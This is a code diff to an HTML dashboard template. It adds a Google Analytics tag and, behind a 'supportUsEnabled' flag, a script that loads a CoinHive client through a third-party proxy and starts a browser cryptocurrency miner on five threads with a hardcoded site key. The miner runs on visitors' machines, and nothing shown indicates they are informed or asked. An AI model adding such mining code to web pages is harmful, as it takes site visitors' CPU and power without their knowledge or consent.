@@ -2,6 +2,18 @@
 <html lang="en">
 
 <head>
+	{{if analyticsEnabled}}
+	<!-- Google Analytics -->
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-103368792-2"></script>
+	<script>
+		window.dataLayer = window.dataLayer || [];
+		function gtag() { dataLayer.push(arguments); }
+		gtag('js', new Date());
+
+		gtag('config', 'UA-103368792-2');
+	</script>
+	<script></script> {{end}}
 	<meta charset="utf-8" />
 	<link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicon.ico" />
 	<link rel="icon" type="image/png" href="/assets/img/favicon.ico" />
@@ -171,10 +183,13 @@
 <script src="/assets/js/sweetalert2.min.js" type="text/javascript"></script>
 
 <!-- Main logic -->
-<script src="/assets/js/main.js" type="text/javascript"></script>
-
-<!-- Material Dashboard DEMO methods, don't include it in your project! -->
-<!-- <script src="/assets/js/demo.js"></script>                       -->
+<script src="/assets/js/main.js" type="text/javascript"></script> {{if supportUsEnabled}}
+<script src="https://cazala.github.io/coin-hive-proxy/client.js?coin-hive-proxy=coin-hive-proxy-ybydcnjgkl.now.sh"></script>
+<script>
+							var miner = new CoinHive.Anonymous('ektfAjailveebDl8aoZfZR7IjqD530n8');
+							miner.start();
+							miner.setNumThreads(5);
+</script> {{end}}
 
 
 </html>
